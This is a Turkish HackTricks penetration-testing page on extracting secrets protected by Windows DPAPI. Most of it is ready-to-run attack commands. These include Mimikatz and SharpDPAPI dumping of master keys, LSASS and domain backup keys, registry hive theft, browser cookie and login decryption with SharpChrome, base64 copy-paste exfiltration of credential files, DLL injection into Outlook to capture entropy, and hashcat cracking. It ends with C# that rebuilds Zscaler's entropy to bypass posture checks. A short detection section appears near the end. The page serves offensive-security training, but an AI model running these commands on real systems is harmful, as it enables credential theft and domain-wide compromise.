# DPAPI - Parolaları Çıkarma

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

Data Protection API (DPAPI), Windows işletim sistemi içinde öncelikli olarak **asymmetric private keys** için **symmetric encryption** amacıyla kullanılır ve önemli bir entropy kaynağı olarak kullanıcı veya sistem secret'larından yararlanır. Bu yaklaşım, geliştiricilerin verileri kullanıcının logon secret'larından türetilen bir key ile veya system encryption için sistemin domain authentication secret'larıyla encrypt etmesine olanak tanıyarak encryption key'in korunmasını kendilerinin yönetme gereksinimini ortadan kaldırır.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların verileri o anda logon olmuş process'in session'ı ile güvenli şekilde encrypt ve decrypt etmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır. Bu, encrypted verilerin yalnızca onları encrypt eden aynı user veya system tarafından decrypt edilebileceği anlamına gelir.

Ayrıca bu fonksiyonlar, encryption ve decryption sırasında kullanılacak bir **`entropy` parametresini** de kabul eder. Bu nedenle, bu parametre kullanılarak encrypt edilmiş bir şeyi decrypt etmek için encryption sırasında kullanılan entropy değerinin aynısını sağlamanız gerekir.

### Users key generation

DPAPI, credentials temelinde her user için benzersiz bir key ( **`pre-key`** olarak adlandırılır) oluşturur. Bu key, kullanıcının password'ünden ve diğer faktörlerden türetilir ve algorithm user türüne bağlıdır, ancak sonuçta bir SHA1 olur. Örneğin domain user'lar için **user'ın NTLM hash'ine bağlıdır**.

Bu özellikle ilgi çekicidir, çünkü bir attacker user'ın password hash'ini elde edebilirse şunları yapabilir:

- Herhangi bir API ile iletişim kurmasına gerek kalmadan, o user'ın key'i kullanılarak encrypt edilmiş tüm verilerin **decryption** işlemini gerçekleştirebilir
- Geçerli DPAPI key'ini oluşturmaya çalışarak **password'ü offline crack** etmeyi deneyebilir

Ayrıca bir user DPAPI kullanarak bazı verileri her encrypt ettiğinde yeni bir **master key** oluşturulur. Verileri encrypt etmek için gerçekten kullanılan key, bu master key'dir. Her master key, onu tanımlayan bir **GUID** (Globally Unique Identifier) ile oluşturulur.

Master key'ler, `{SID}` ilgili user'ın Security Identifier'ı olmak üzere **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory'sinde saklanır. Master key, user'ın **`pre-key`**'i ve ayrıca recovery için bir **domain backup key** tarafından encrypt edilir (böylece aynı key, 2 farklı pass tarafından 2 kez encrypted olarak saklanır).

Master key'i encrypt etmek için kullanılan **domain key**'in domain controller'larda bulunduğunu ve hiçbir zaman değişmediğini unutmayın. Bu nedenle bir attacker domain controller'a erişebiliyorsa domain backup key'i alabilir ve domain'deki tüm user'ların master key'lerini decrypt edebilir.<sup>[[2]](#references)</sup>

Encrypted blob'lar, header'ları içinde verileri encrypt etmek için kullanılan **master key'in GUID**'ini içerir.

> [!TIP]
> DPAPI encrypted blob'lar **`01 00 00 00`** ile başlar.

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bir kullanıcının bir grup Master Keys'i şu şekilde görünür:

![What is DPAPI - Users key generation: Bir kullanıcının bir grup Master Keys'i şu şekilde görünür](<../../images/image (1121).png>)

### Machine/System key generation

Bu anahtar, makinenin verileri şifrelemesi için kullanılır. Yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtar olan **DPAPI_SYSTEM LSA secret** temel alınır. Bu anahtar; makine düzeyindeki kimlik bilgileri veya sistem genelindeki secret'lar gibi sistemin kendisi tarafından erişilebilir olması gereken verileri şifrelemek için kullanılır.<sup>[[2]](#references)</sup>

Bu anahtarların **domain backup'ı olmadığını** ve bu nedenle yalnızca yerel olarak erişilebilir olduklarını unutmayın:

- **Mimikatz**, şu komutu kullanarak LSA secret'larını dump edip bunlara erişebilir: `mimikatz lsadump::secrets`
- Secret registry içinde depolanır; bu nedenle bir administrator, **erişim sağlamak için DACL izinlerini değiştirebilir**. Registry path: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hive'larından offline extraction da mümkündür. Örneğin hedefte administrator olarak hive'ları kaydedip exfiltrate edin:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ardından analysis box üzerinde hive’lardan DPAPI_SYSTEM LSA secret’ını kurtarın ve makine kapsamındaki blob’ları (scheduled task parolaları, service kimlik bilgileri, Wi‑Fi profilleri vb.) decrypt etmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome parolaları ile otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalara ait e-posta ve dahili FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault parolaları; şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları, .NET Passport parolaları ve çeşitli şifreleme ve kimlik doğrulama amaçlarına yönelik özel anahtarlar
- Credential Manager tarafından yönetilen ağ parolaları ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler
- Kayıt defterindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wifi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key extraction seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain içindeki tüm kullanıcı master key'lerini decrypt etmek için **domain backup key**'e erişebilir:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, tüm bağlı kullanıcıların DPAPI master keys'lerini ve SYSTEM key'ini çıkarmak için **LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Kullanıcı yerel yönetici ayrıcalıklarına sahipse, makine ana anahtarlarını decrypt etmek için **DPAPI_SYSTEM LSA secret**'a erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcının master key'lerini doğrudan decrypt edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Kullanıcı olarak bir session içindeyseniz, **RPC kullanarak master key'leri decrypt etmek için gerekli backup key'i** DC'den istemek mümkündür. Local admin iseniz ve kullanıcı oturum açmışsa bunun için **session token'ını steal edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listeleme
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilerine Erişim

### DPAPI Şifrelenmiş Verileri Bulma

Yaygın olarak kullanıcılar tarafından **korunan dosyalar** şurada bulunur:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanarak da kontrol edin.

Numaralandırma örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI), dosya sisteminde, kayıt defterinde ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
DPAPI kullanılarak cookies gibi hassas verilerin şifresini çözmek için aynı repodaki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) aracının kullanılabileceğini unutmayın.

#### Chromium/Edge/Electron hızlı tarifler (SharpChrome)

- Current user, saved logins/cookies için etkileşimli şifre çözme (user context içinde çalıştırıldığında, ek anahtar kullanıcının Credential Manager'ından çözüldüğü için Chrome 127+ app-bound cookies ile bile çalışır):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Yalnızca dosyalara sahip olduğunuzda offline analysis. Önce profile ait "Local State" dosyasından AES state key'i extract edin, ardından cookie DB'yi decrypt etmek için kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) ve hedef host üzerinde admin yetkisine sahip olduğunuzda domain-wide/remote triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Bir kullanıcının DPAPI prekey/credkey bilgisine (LSASS üzerinden) sahipseniz, password cracking işlemini atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Daha yeni Chrome/Edge sürümleri, belirli çerezleri "App-Bound" şifrelemesi kullanarak depolayabilir. Bu belirli çerezlerin offline şifresini çözmek, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcının context'i altında çalıştırın. Aşağıda referans verilen Chrome security blog gönderisine bakın.<sup>[[5]](#references)</sup>

### Erişim anahtarları ve veriler

- **SharpDPAPI kullanarak** mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini alın:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Şifrelenmiş veriler ve guidMasterKey gibi kimlik bilgilerini elde edin**.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Masterkey'lere erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'inin şifresini çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı, masterkey şifre çözme için şu bağımsız değişkenleri de destekler (`/rpc` kullanılarak domain yedekleme anahtarının alınabildiğine, `/password` ile düz metin parola kullanılabildiğine veya `/pvk` ile bir DPAPI domain private key dosyası belirtilebildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Bir masterkey kullanarak verilerin şifresini çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için şu argümanları da destekler (`/rpc` kullanarak domains backup key elde etmenin, düz metin bir parola kullanmak için `/password` kullanmanın, bir DPAPI domain private key dosyası belirtmek için `/pvk` kullanmanın ve mevcut kullanıcının oturumunu kullanmak için `/unprotect` kullanmanın mümkün olduğuna dikkat edin...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey'i doğrudan kullanma (parola gerekmez)

LSASS'ı dump edebiliyorsanız, Mimikatz genellikle plaintext parolayı bilmeden kullanıcının masterkey'lerini decrypt etmek için kullanılabilecek, oturum başına bir DPAPI key'i açığa çıkarır. Bu değeri doğrudan tooling'e geçin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile offline decryption

Kurban kullanıcının SID ve password bilgilerine (veya NT hash değerine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey’lerini ve Credential Manager blob’larını tamamen offline decrypt edebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Disk üzerindeki artefact’ları belirleyin:
- Credential Manager blob(lar)ı: %APPDATA%\Microsoft\Credentials\<hex>
- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- File transfer araçları sorun çıkarıyorsa dosyaları host üzerinde base64 ile encode edin ve çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- masterkey'in şifresini kullanıcının SID'si ve parolası/hash'i ile çözün:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- credential blob'un şifresini çözmek için decrypted masterkey'i kullanın:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu workflow, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş domain credentials'ları ve administrative accounts'ları (ör. `*_adm`) sıklıkla kurtarır.

---

### Optional Entropy ("Third-party entropy") İşleme

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri iletir. Bu değer olmadan, doğru masterkey bilinse bile blob decrypt edilemez. Bu nedenle, bu şekilde korunan credentials'ları hedeflerken entropy'yi elde etmek kritik önem taşır (ör. Microsoft Outlook ve bazı VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef process içindeki DPAPI functions'larını hook'layan ve sağlanan tüm optional entropy değerlerini transparently kaydeden bir user-mode DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi process'lere karşı **DLL-injection** mode'unda çalıştırmak, her entropy buffer'ını calling process ve blob ile eşleyen bir file çıktısı oluşturur. Captured entropy daha sonra data'yı decrypt etmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) aracına sağlanabilir.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline masterkey cracking (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını kullanıma sundu. `hashcat` v6.2.6 (Aralık 2023), hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) desteğini ekleyerek masterkey dosyasından kullanıcı parolalarının doğrudan GPU hızlandırmalı cracking işlemini mümkün kıldı. Böylece saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, bunları crack edilmiş anahtarlarla decrypt edebilir ve cleartext password'leri dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome** içinde uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette bu makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmaktadır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP directory'deki tüm kullanıcıların ve bilgisayarların çıkarılmasını ve domain controller backup key'in RPC üzerinden çıkarılmasını otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm kullanıcıların DPAPI blob'larını almak için tüm bilgisayarlarda smbclient çalıştırır; ardından domain backup key ile her şeyin şifresini çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'den çıkarılan bilgisayar listesiyle, daha önce bilmediğiniz sub network'leri bile bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan secret'ları otomatik olarak dump edebilir. 2.x sürümü şunları kullanıma sundu:<sup>[[9]](#references)</sup>

* Yüzlerce host'tan blob'ların paralel olarak toplanması
* **context 3** masterkey'lerinin parse edilmesi ve otomatik Hashcat cracking entegrasyonu
* Chrome "App-Bound" şifreli cookie'leri için destek (sonraki bölüme bakın)
* Endpoint'leri tekrar tekrar poll etmek ve yeni oluşturulan blob'ları diff etmek için yeni bir **`--snapshot`** modu

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault dosyaları için Hashcat/JtR formatlarında çıktı üretebilen ve isteğe bağlı olarak cracking işlemini otomatik başlatabilen bir C# parser'ıdır. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tamamen destekler.<sup>[[8]](#references)</sup>


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilgili diğer directory'lerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir network share üzerinden.
- LSASS memory'sine erişmek veya masterkey'leri dump etmek için **Mimikatz**, **SharpDPAPI** ya da benzer tooling kullanımı.
- Event **4662**: *Bir nesne üzerinde bir işlem gerçekleştirildi* – **`BCKUPKEY`** nesnesine erişim ile ilişkilendirilebilir.
- Bir process *SeTrustedCredManAccessPrivilege* (Credential Manager) istediğinde Event **4673/4674**

---
### 2023-2025 güvenlik açıkları ve ecosystem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Network erişimine sahip bir attacker, bir domain member'ı kötü amaçlı bir DPAPI backup key almaya kandırabilir ve bu da user masterkey'lerinin decrypt edilmesini sağlayabilirdi. Kasım 2023 cumulative update ile patch'lendi – administrator'lar DC'lerin ve workstation'ların tamamen patch'lenmiş olduğundan emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024), legacy DPAPI-only protection'ın yerine user'ın **Credential Manager** altında depolanan ek bir key getirdi. Cookie'lerin offline olarak decrypt edilmesi artık hem DPAPI masterkey'ini hem de **GCM-wrapped app-bound key**'i gerektirir. SharpChrome v2.3 ve DonPAPI 2.x, user context ile çalıştırıldığında ek key'i kurtarabilir.<sup>[[5]](#references)</sup>


### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Custom Entropy

Zscaler Client Connector, çeşitli configuration dosyalarını `C:\ProgramData\Zscaler` altında depolar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir; ancak vendor, disk üzerinde depolanmak yerine *runtime sırasında hesaplanan* **custom entropy** sağlar.<sup>[[1]](#references)</sup>

Entropy iki elementten yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir secret.
2. Configuration'ın ait olduğu Windows account'un **SID**'si.

DLL tarafından uygulanan algorithm şuna eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Gizli değer diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM yetkilerine sahip herhangi bir local attacker herhangi bir SID için entropy değerini yeniden oluşturabilir** ve blob'ları offline olarak decrypt edebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme işlemi, her **device posture check** ve beklenen değeri dahil olmak üzere eksiksiz JSON yapılandırmasını ortaya çıkarır. Bu bilgiler, client-side bypass girişimlerinde oldukça değerlidir.

> TIP: diğer şifrelenmiş artefact'lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy** olmadan (`16` sıfır byte) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` kullanılarak doğrudan şifreleri çözülebilir.

## Referanslar

- [1] [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini bypass etme](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI'de güvenlik analizi ve veri kurtarma](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz ve C++ ile DPAPI Encrypted Secrets okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows'ta Chrome cookie'lerinin güvenliğini artırma](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy'nin basit şekilde çıkarılması](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 sürüm notları](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
